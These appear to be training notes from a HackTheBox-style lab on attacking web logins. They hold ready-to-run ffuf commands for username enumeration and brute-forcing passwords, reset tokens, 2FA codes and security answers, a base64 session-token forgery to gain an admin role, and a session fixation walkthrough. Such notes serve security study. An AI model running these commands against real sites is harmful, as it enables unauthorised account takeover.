## Enumerating Users

See if the application gives you an error when attempting to login. If you receive an "Unknown user" or similar message, you can brute force valid users.

```shell
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

## Brute-Forcing Passwords

You can pull words from a wordlist that have an upper character, lower character, digit, and minimum length of 10 characters with this: 

```shell
grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

Then you can use that custom wordlist to attack a valid user:

```shell
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

## Brute-Forcing Password Reset Tokens

Basic Password Reset Flow

![[Pasted image 20240621140243.png]]

#### Generate a wordlist of tokens

```bash
seq -w 0 9999 > tokens.txt
```

#### Fuzz token with wordlist

```bash
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

## Brute-Forcing 2FA Codes

```bash
ffuf -w ./tokens.txt -u http://94.237.57.134:31473/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=efm2jad59b7h6bucb7vhumheop" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

## Brute-Forcing Password Resets

### City-Based
```bash
ffuf -w ./city_wordlist.txt -u http://94.237.54.176:52122/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=ruamg28t7sqoptfq1kee15j82h" -d "security_response=FUZZ" -fr "Incorrect response."
```




## Attacking Session Tokens
### Predictable Session Tokens
Look at the token... can it be easily decoded?

```
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user
```

```
echo -n 'user=htb-stdnt;role=admin' | base64

dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
```

### Session Fixation
1. An attacker obtains a valid session token by authenticating to the web application. For instance, let us assume the session token is `a1b2c3d4e5f6`. Afterward, the attacker invalidates their session by logging out.

2. The attacker tricks the victim to use the known session token by sending the following link: `http://vulnerable.htb/?sid=a1b2c3d4e5f6`. When the victim clicks this link, the web application sets the `session` cookie to the provided value, i.e., the response looks like this:

3. The victim authenticates to the vulnerable web application. The victim's browser already stores the attacker-provided session cookie, so it is sent along with the login request. The victim uses the attacker-provided session token since the web application does not assign a new one.

4. Since the attacker knows the victim's session token `a1b2c3d4e5f6`, they can hijack the victim's session.
